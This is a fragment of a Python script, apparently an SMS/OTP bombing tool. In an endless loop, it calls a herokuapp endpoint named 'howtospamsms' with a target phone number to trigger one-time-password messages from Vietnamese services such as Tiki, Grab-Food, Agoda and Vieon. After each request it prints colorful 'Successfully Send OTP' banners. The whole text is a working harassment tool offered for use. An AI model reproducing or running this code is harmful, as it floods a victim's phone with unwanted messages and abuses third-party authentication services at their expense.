...
Write.Print('Liên Hệ Facebook : Fb.com/PhDinhQuoc '+'\n' ,Colors.red_to_blue, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
...
while True:
    ...
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP The-Gioi-Di-Dong"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')      
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Nhap-Hang-247"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Elines"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Meta-VN"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')      
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Bach-Hoa-Xanh"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Grab-Food"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Tiki"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Go2joy"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Vntrip"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Agoda"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    Write.Print(f"[ {stt} ] [ PhamDinhQuoc ] => Successfully Send OTP Vieon"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)
